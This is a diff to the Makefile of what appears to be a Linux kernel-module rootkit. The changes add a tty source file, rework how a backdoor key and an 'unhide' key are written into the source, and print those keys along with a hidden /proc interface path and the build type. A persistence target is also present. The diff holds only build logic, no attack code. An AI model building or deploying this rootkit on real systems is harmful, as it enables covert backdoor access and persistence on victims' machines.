@@ -32,7 +32,7 @@ COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
 SRC := src/${OBJNAME}.c src/pid.c src/fs.c src/sys.c \
-	src/sock.c src/util.c src/vm.c src/crypto.c
+	src/sock.c src/util.c src/vm.c src/crypto.c src/tty.c
 
 persist=src/persist
 
@@ -46,14 +46,20 @@ all:
 	# TODO: Check if we can generate a random PROCNAME, something like:
 	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
 	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
-	@sed -i 's#^static uint64_t __attribute__((unused)) auto_bdkey = .*#static uint64_t __attribute__((unused)) auto_bdkey = $(BDKEY);#' src/auto.h
-	@sed -i 's#^static uint64_t __attribute__((unused)) auto_unhidekey = .*#static uint64_t __attribute__((unused)) auto_unhidekey = $(UNHIDEKEY);#' src/auto.h
+	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\1$(BDKEY);/" src/sock.c
+	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/kovid.c
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
-	@echo -n "Save this Backdoor KEY: "
-	@echo $(BDKEY) | sed 's/^0x//'
-	@echo -n "Save this LKM unhide KEY: "
-	@echo $(UNHIDEKEY) | sed 's/^0x//'
-	@echo PROCNAME=$(PROCNAME)
+	@echo -n "Backdoor KEY: "
+	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
+	@echo -n "LKM unhide KEY: "
+	@echo "\033[1;37m$(UNHIDEKEY)\033[0m" | sed 's/0x//'
+	@echo "UI: \033[1;37m/proc/$(PROCNAME)\033[0m"
+	@echo -n "Build type: "
+ifdef DEPLOY
+	@echo "\033[1;37mRELEASE\033[0m"
+else
+	@echo "\033[1;37mDEBUG\033[0m"
+endif
 
 persist:
 	sed -i "s|.lm.sh|${UUIDGEN}.sh|g" $(persist).S
@@ -73,10 +79,8 @@ clang-format:
 	clang-format-18 -i src/*.[ch]
 
 reset-auto:
-	@git checkout a6333fdc9e9d647b7d64e9e9cb1e6c0237a8967f \
-		-- src/persist.S 2>/dev/null || true
-	@git checkout 1520b99c4fa2fc2ee6a1d11c50de4e1591321a71 \
-		-- src/auto.h 2>/dev/null || true
+	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\10x0000000000000000;/" src/sock.c
+	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\10x0000000000000000;/" src/kovid.c
 
 clean: reset-auto
 	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
